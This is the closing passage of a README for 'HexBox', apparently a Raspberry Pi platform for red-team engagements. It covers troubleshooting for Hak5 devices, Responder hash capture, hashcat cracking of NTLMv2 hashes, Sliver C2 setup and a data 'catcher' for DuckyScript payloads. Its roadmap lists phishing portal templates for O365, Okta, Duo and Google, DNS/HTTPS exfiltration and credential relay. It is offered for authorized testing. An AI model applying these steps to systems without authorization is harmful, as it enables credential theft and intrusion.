# Test SSH manually
ssh root@172.16.42.1   # Pineapple
ssh root@172.16.64.1   # Bash Bunny (arming mode only)

# Check default IPs match your firmware version
# Pineapple Mark VII: 172.16.42.1
# Bash Bunny Mark II: 172.16.64.1 (not 172.16.42.1)
```

### Dashboard shows device as offline (red dot)

The status check is a TCP connect to the device's SSH port. If the device is connected but shows red:
1. Verify the IP in `config.json` matches the device's actual IP
2. Check your Pi's routing: `ip route`; the device subnet must be reachable
3. Bash Bunny: must be in **arming mode** (switch position 3) for SSH access

### Responder not capturing hashes

- Verify Responder is bound to the correct interface (`IFACE_RESPONDER` in `config.json → interfaces.responder`)
- Ensure no other process is binding port 445: `sudo ss -tlnp | grep 445`
- On modern Windows, LLMNR/NBT-NS may be disabled by GPO — try mDNS poisoning instead

### hashcat fails / no GPU

Hashcat runs in CPU-only mode on all Pi models — GPU acceleration is not available.
Pi 5 (Cortex-A76) cracks roughly 3× faster than a Pi 3B. For best performance, offload to a dedicated GPU machine:
```bash
# Copy hashes to a machine with a GPU, crack there, copy cracked.txt back
scp pi@<pi-ip>:~/hexbox/loot/ntlmv2_hashes.txt .
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
scp cracked.txt pi@<pi-ip>:~/hexbox/loot/
# Dashboard detects the file change and updates Intel → Cracked Passwords automatically
```

### Pi 5: USB devices not detected / underpowered

Pi 5 limits USB power to 600mA/port when using a 15W supply. Symptoms: Hak5 devices
show offline immediately, USB NICs don't enumerate, Flipper Zero drops connection.

```bash
# Verify usb_max_current_enable is set
grep usb_max_current /boot/firmware/config.txt
# Should show: usb_max_current_enable=1
# If missing, run: sudo bash setup/hexbox_setup.sh  (safe to re-run)
# Then: sudo reboot
# ALSO: confirm your power supply is rated 27W (5V/5A) — a 15W supply
# cannot deliver enough current even with this flag set.
```

### Pi 5: Flipper Zero not detected on /dev/ttyACM0

The Pi 5 with Raspberry Pi OS Bookworm has known quirks with USB CDC-ACM devices.
```bash
# Check if the device appears at all
lsusb | grep Flipper
ls /dev/ttyACM* /dev/ttyUSB*

# If it doesn't appear, try a different USB port or USB hub
# Check kernel messages for enumeration errors
dmesg | tail -20

# If using a USB hub, ensure the hub is USB 2.0 (ACM quirks with USB 3.0 hubs)
# Update config.json flipper.serial_port if the device appears at a different path
```

### Bookworm: pip install fails with "externally managed"

```bash
# Install python3-full (run as root)
sudo apt install -y python3-full
# Then retry
pip3 install --break-system-packages -r requirements.txt
```

### Kismet no networks / GPS not updating

```bash
# Verify Kismet is running
curl -u kismet:kismet http://localhost:2501/system/status.json

# Check GPS
gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock   # adjust device path
cgps                                        # live GPS readout
```

### Sliver generate fails

```bash
# Check sliver-server is running
pgrep sliver-server

# Verify operator config exists
ls ~/.sliver/hexbox-operator.cfg

# Generate config if missing
sliver-server operator --name hexbox --lhost 127.0.0.1 --save ~/.sliver/hexbox-operator.cfg
```

### Catcher not receiving data

- Verify `catcher.py` is running: `pgrep -a python3 | grep catcher`
- Check the IP in your DuckyScript payload matches the Pi's IP (run `setup/configure.sh` to update all payloads automatically)
- Ensure port 8000 is reachable from the target machine: `curl http://<pi-ip>:8000/`

### BloodHound upload fails

```bash
# Test BloodHound CE connectivity
curl -u admin:BloodHound! http://localhost:8080/api/v2/bloodhound-users
# Verify credentials in config.json → bloodhound match your BloodHound CE setup
```

### Pre-flight check fails

```bash
sudo python3 scripts/preflight.py
# Read the NO-GO items carefully — each has a suggested fix
# Common causes: missing tool, wrong interface name, device not connected
```

---

## 🗺️ Roadmap

### Completed

| Phase | Highlights |
|-------|-----------|
| **Phase 1–2** | Core Flask C2, config-driven setup, parallel device status, tabbed dashboard, token auth, loot/log APIs |
| **Phase 3** | SSE live feed, full intel engine (hash/WiFi/nmap/sysinfo parsing), DuckyScript payload builder, engagement sessions, hashcat integration, AD recon, HTML report generator |
| **Phase 4** | Bash Bunny SSH integration, Flipper Zero serial bridge, Sliver C2 implant generation, BloodHound CE auto-ingest |
| **Phase 5** | Custom Evil Portal templates (O365/Okta/Duo/Google), PCAP analysis dashboard, GPS war-driving with Kismet, Leaflet map, CSV/KML export |
| **Phase 6** | AES-256-GCM encrypted exfil over DNS subdomains and HTTPS, Mobile PWA companion app, hashcat cracked password feedback loop, full security audit + remediation |
| **Phase 7** | Raspberry Pi 4 and 5 compatibility: model-aware setup script, Bookworm support, dynamic MAC spoof service, Pi 5 USB current unlock, updated preflight hardware checks |

### Upcoming

- [ ] Multi-engagement isolation — separate `loot/` directories per job with named workspaces
- [ ] Automated Sliver beacon on exfil completion — trigger exfil when implant checks in
- [ ] Push notifications to mobile via [ntfy.sh](https://ntfy.sh/) or WebPush
- [ ] Automated Evil Portal credential relay — forward captured creds to the real portal to avoid victim lockout
- [ ] Packet Squirrel PCAP streaming — live tshark feed direct to Intel tab without manual upload

---

## 🤝 Contributing

PRs are welcome from authorized red team operators. Before submitting:

- **Do not** commit real callback IPs, credentials, or client-specific loot
- **Do not** commit a modified `config.json` with real passwords or keys
- **Do** tag new payload files with target OS, tested device, and any known AV detection
- **Do** test configuration changes against `scripts/preflight.py`
- Security findings: open an issue with a minimal reproduction case

---

## 📚 Recommended Resources

| Resource | Notes |
|----------|-------|
| *The Hacker Playbook 3* — Peter Kim | Field-proven red team TTPs |
| *Red Team Development and Operations* — Joe Vest | Program-level methodology |
| MITRE ATT&CK Framework | Map your techniques to adversary emulation plans |
| Hak5 docs — [docs.hak5.org](https://docs.hak5.org) | Device-specific payload APIs |
| Sliver wiki — [github.com/BishopFox/sliver/wiki](https://github.com/BishopFox/sliver/wiki) | C2 framework reference |
| BloodHound CE docs — [support.bloodhoundenterprise.io](https://support.bloodhoundenterprise.io/) | AD attack path setup |

---

## 📜 License

Released under an **Authorized Use Only** license. By cloning or using this repository you agree:

1. You will only deploy HexBox against systems you **own** or have **explicit written authorization** to test
2. You will not redistribute this toolkit to unauthorized parties
3. You accept full legal and ethical responsibility for every action taken with this software
4. You will comply with all applicable laws in your jurisdiction

---

## 💀 Final Word

HexBox is a **force multiplier** — not a magic button. Effective red teaming requires recon, patience, creativity, and operational discipline. This platform removes the friction of juggling seven different devices and interfaces so you can focus on the engagement.

The tool amplifies your skill. It does not replace it.

Stay sharp. Stay authorized. Stay on the dark side.

**— The HexBox Project**
